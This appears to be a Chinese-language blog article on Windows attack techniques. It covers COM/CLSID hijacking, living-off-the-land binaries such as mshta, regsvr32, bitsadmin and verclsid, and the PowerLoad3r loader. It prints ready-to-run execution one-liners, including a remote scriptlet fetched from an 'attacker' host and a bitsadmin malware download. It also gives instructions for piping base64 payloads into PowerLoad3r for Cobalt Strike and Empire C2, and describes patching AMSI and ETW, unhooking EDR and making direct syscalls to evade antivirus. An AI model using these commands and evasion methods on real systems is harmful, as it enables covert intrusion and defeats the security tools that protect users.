- PowerShell 对象是作为 .NET 对象创建的（如PSObject），这些对象由 .NET 的垃圾收集器管理，但 PowerShell 的内部内存管理可确保在运行空间关闭时正确处置它们  
  
劫持并滥用鲜为人知的 CLSID  
  
那么 CLSID 是什么？  
- CLSID（类标识符）是 128 位 GUID（例如{374DE290-123F-4565-9164-39C4925E467B}），可唯一标识 Windows 中的 COM 对象，使应用程序能够定位并与系统或第三方组件（如设备管理器或 UI 处理程序）交互。  
  
- 它们被映射到 Windows 注册表中HKEY_CLASSES_ROOT\CLSID，其中子键定义对象的可执行文件（DLL/EXE）、线程模型和权限的路径。  
  
- 应用程序使用CoCreateInstance带有 CLSID 的 API 来实例化 COM 对象 - 对于文件资源管理器的旧式搜索框 ( {bc32b5-4eec-4de7-972d-bd8bd0324537}) 或 Office 应用程序等功能至关重要。  
  
- 攻击者通过覆盖用户级合法注册表项来劫持 CLSID HKCU\Software\Classes\CLSID，以将受信任的进程（例如explorer.exe）重定向到没有管理员权限的恶意负载。  
  
- 被劫持的 CLSID 会秘密执行，通常会在系统重启后继续存在，并通过模仿合法的系统任务（如磁盘清理vssadmin delete shadows）来绕过检测。  
  
- 缓解措施包括监视注册表更改、强制对 CLSID 密钥进行最小权限访问、通过 AppLocker 将受信任的 COM 对象列入白名单以及验证引用二进制文件的数字签名。  
  
- 开发人员必须确保正确的 CLSID 注册（例如，使用regsvr32）并匹配 32/64 位体系结构，以避免出现类似的错误0x80040154。  
  
现在来看看滥用它们的令人兴奋的部分：  
  
ShellWindows COM（有效性：★★★★☆）  
  
```
$sh = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8–11CF-A442–00A0C90A8F39"))$sh.Item().Document.Application.ShellExecute("calc.exe", "", "", $null, 0)
```  
  
  
ShellBrowserWindow（有效性：★★★★★）  
```
$browser = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1–11D1–8455–00A0C91F3880"))$browser.Document.Application.ShellExecute("calc.exe")
```  
  
  
Excel 4.0宏（有效性：★★★★☆）  
```
$excel = [activator]::CreateInstance([type]::GetTypeFromCLSID("00024500–0000–0000-C000–000000000046"$excel.ExecuteExcel4Macro('CALL("user32","ShellExecuteA","JJCCJJ",0,"open","calc.exe","","",5)')
```  
  
  
XMLDOM Remote Scriptlet（有效性：★★★★★）  
```
$xml = [activator]::CreateInstance([type]::GetTypeFromCLSID("88d969c5-f192–11d4-a65f-0040963251e5"))$xml.async = $false$xml.load("http://attacker/calc.sct")
```  
  
  
MMC20.应用（有效性：★★★☆☆）  
```
$mmc = [activator]::CreateInstance([type]::GetTypeFromCLSID("49B2791A-B1AE-4C90–9B8E-E860BA07F889"))$mmc.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c calc.exe", "7")
```  
  
  
Verclsid.exe代理（有效性：★★★★☆）  
```
New-Item -Path “HKCU:\Software\Classes\CLSID\{01575CFE-9A55–4003-A5E1-F38D1EBDCBE1}\InprocServer32” -Force Set-ItemProperty -Path “HKCU:\Software\Classes\CLSID\{01575CFE-9A55–4003-A5E1-F38D1EBDCBE1}\InprocServer32” -Name “(Default)” -Value “C:\Windows\System32\calc.exe” & verclsid.exe /S /C “{01575CFE-9A55–4003-A5E1-F38D1EBDCBE1}”
```  
  
  
滥用（鲜为人知的）Windows 二进制文件执行隐形负载  
  
Windows 内置了一些攻击者喜欢的工具，这些工具是他们每天使用的受信任的二进制文件，但只要稍加改动，它们就会变成让安全人员蒙蔽双眼的有效载荷启动器  
  
MSHTA直接在内存中执行 VBScript 或 JavaScript，无文件，无痕迹  
  
```
mshtavbscript:Execute(“CreateObject(“”WScript.Shell””).Run “”calc.exe””,0 : close”)
```  
  
  
Conhost在后台安静地运行 payloade44s headless，不会产生噪音  
```
conhost.exe — headless C:\Windows\System32\calc.exe
```  
  
  
Forfiles会默默循环并执行有效载荷，没有人会多看这个工具  
```
forfiles /P C:\Windows\System32 /M calc.exe /C “cmd /c calc.exe”
```  
  
  
Regsvr32通过 COM 对象加载脚本，绕过大多数防御措施（这一点很容易被检测到）  
```
regsvr32 /s /u /n /i:calc.exe scrobj.dll
```  
  
  
BITSAdmin（后台传输服务）秘密下载有效载荷  
```
bitsadmin /transfer job /download /priority high http://example.com/malware.exe C:\temp\malware.exe
```  
  
  
InstallUtil（.NET 实用程序）在安装期间运行恶意 .NET 程序集  
```
bash InstallUtil.exe /logfile= /LogToConsole=false /U malicious.dll
```  
  
  
Rasautou是的，你忘记了远程访问工具的存在，它会像幽灵一样默默地执行有效载荷  
```
rasautou.exe –d/-a C:\Windows\System32\calc.exe
```  
  
  
- PowerLoad3r 概述  
  
如何修改它以运行您想要的程序（如果您想了解它的功能以及它首先做什么，请转到本节的下一部分！）  
  
听说过 PowerLoad3r ( https://github.com/0xNinjaCyclone/PowerLoad3r ) 吗？没有？好吧，让我告诉你，这是一个专为运行 PowerShell 脚本而设计的工具，这个工具很厉害！它包含高级规避技术，你猜怎么着？它的一些魔法是用纯汇编和 C 语言制作的。很令人兴奋，对吧？  
  
但等等，还有更多！准备好升级了吗？让我们深入了解如何将 PowerLoad3r 与您选择的任何 C2 集成。  
  
那么，您知道 WriteToPipes 函数吗？这就是魔法开始的地方。您需要修改它的调用以记下 shellcode，默认情况下，它使用 IEX 在第 622 行加载和执行 Mimikatz，因此我们将在此处修改代码。首先，仅从 shellcode 计算 base64 编码文本的字符数大小。然后，计算这些 base64 字符的总和，并在上面添加一个锦上添花：额外的 8。是的，您没听错，添加 8（base64 字符 + 8），这就是您要作为参数赠送的大小。  
  
以下是一个小预览：  
  
```
WriteToPipe（“$s = \” JHUATQBOAEEAQQBBAD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBp AHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA= \" \n " , 392 ); WriteToPipe ( "$d = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($s)) \n " , 87 ); WriteToPipe ( "IEX $d \ n " , 7 );
```  
  
  
逃避卡巴斯基 PoC：与 CobaltStrike C2 集成：  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taegB05Ve4ZIB108iaBNHv7LI4j7YJU9GKB0Zjpy3yicSB2B07Gq5tGWrkVu9hExwicdicGibMdZjwmYOUw/640?wx_fmt=webp&from=appmsg "")  
  
Empire C2（视频）：演示将很快上传。  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taegB05Ve4ZIB108iaBNHv7LIiaBtZ34GNnNnzEyK5777j7TF62DtNod4W917VuNDNKzQArnp7ruBcsA/640?wx_fmt=webp&from=appmsg "")  
  
使用 Empire C2  
  
猜猜接下来发生了什么？我们彻底躲过了卡巴斯基互联网安全软件的攻击！。  
  
PowerLoad3r 如何工作？  
  
不要对博客的这一部分感到奇怪，我将用一个故事来解释这个神奇的工具:))  
  
从这里检查工具 => https://github.com/0xNinjaCyclone/PowerLoad3r  
  
子进程的骗局  
  
故事开始于 PowerLoad3r 在内存中创建一个欺骗性的 PowerShell 实例，这种技术旨在绕过应用程序控制，并作为 Sysmon/事件日志的早期干扰，确保进程创建的实际指令不可见。然后，PowerLoad3r 将特定策略应用于子进程，防止任何未签名的 Microsoft DLL 加载到子进程中。该策略旨在阻止 EDR 系统可能依赖的基于 DLL 的检测方法。  
  
他们的计划主要涉及父进程与子进程（名为“ pwsh.exe ”）之间的秘密通信。使用“匿名管道”，创建了一个隐藏通道，允许父进程向子进程发送 PowerShell 命令，而无需将其作为参数传递。这种巧妙的策略帮助 PowerLoad3r 避免被 EDR 系统检测到。  
  
不过，父进程并没有袖手旁观。它密切关注子进程，寻找来自 EDR 安全机制的任何注入钩子。如果发现任何钩子，PowerLoad3r 会迅速将其移除，保护子进程并使操作保持隐秘。此外，父进程修补了子进程中的关键安全功能，如 AMSI（反恶意软件扫描接口）和 ETW（Windows 事件跟踪），使 EDR 更难检测到该活动。  
  
父流程策略  
随着故事的继续，焦点转移到父进程 PowerLoad3r 上，它已准备好施展自己的花招。第一步是使用动态加载来混淆 API。这是一个巧妙的策略，可以避免导入地址表 (IAT)，使 API 调用对 EDR 系统不可见。  
  
动态加载如何帮助绕过导入地址表（IAT）？  
  
=> IAT 是程序可执行文件的一部分，它列出了程序所需的 DLL（动态链接库）中的外部函数的地址。当程序启动时，操作系统会用这些函数的实际内存地址填充 IAT。但是，动态加载的工作原理是在运行时解析函数的地址，而不是将它们列在 IAT 中。这种方法允许程序绕过 IAT，使安全系统更难检测到可能隐藏在 IAT 中的恶意活动。  
  
PowerLoad3r 更进一步，使用自定义汇编代码来实现 GetModuleHandle 和 GetProcAddress 等函数。通过利用 HellsGate、HalosGate 和 Veles 的 Reeks 等先进技术，PowerLoad3r 能够直接进行系统调用。这种强大的方法绕过了 EDR 的监控，使 PowerLoad3r 能够不被察觉地执行其操作，使 EDR 系统陷入混乱，因为它们无法跟踪其动作。  
  
解除挂钩技术与 HellsGate、HalosGate 和 Veles 的 Reeks 结合如何有助于执行直接系统调用以逃避安全机制？  
  
=>解除挂钩技术与 HellsGate、HalosGate 和 Veles 的 Reeks 结合使用时，可以更隐秘地执行直接系统调用，从而帮助规避安全机制。HellsGate、HalosGate 和 Veles 的 Reeks 是解除挂钩规避技术，有助于执行间接系统调用（即低级系统操作），绕过安全软件可以监控的常见 API 调用。解除挂钩是指删除或禁用安全解决方案放置的用于监控系统行为的挂钩的过程。通过与这些框架一起使用解除挂钩，恶意代码可以通过确保安全监控挂钩被中和来逃避检测，而直接系统调用（绕过更高级别的 API）用于与系统交互，从而降低被安全软件检测到的机会。  
  
修改了钩子引擎检测点叙述，避免了扫描钩子引擎 DLL 的误解。PowerLoad3r 阐明了钩子本身才是焦点。如果发现钩子诱捕了进程，父母就要准备好执行解钩操作，将孩子从潜在的危险中解救出来，这是一个明智的举动，可以确保他们的逃脱不受伤害。  
  
随着 PowerLoad3r 和 PowerShell 字节大小编年史的结束，他们留下了一群困惑的 EDR 哨兵、修补过的进程和刻在数字传说史册上的逃避遗产。他们的冒险揭开了技术实力和颠覆性策略的故事，这些故事将在未来几个周期中被代码制作者和二进制诗人解析和思考。当他们重新融入代码宇宙时，他们的玩笑和欢乐之旅的故事等待着在逃避编年史中逐字节、逐位地重述。  
  
我们终于完成了！  
  
感谢您深入这次旅程！  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
  
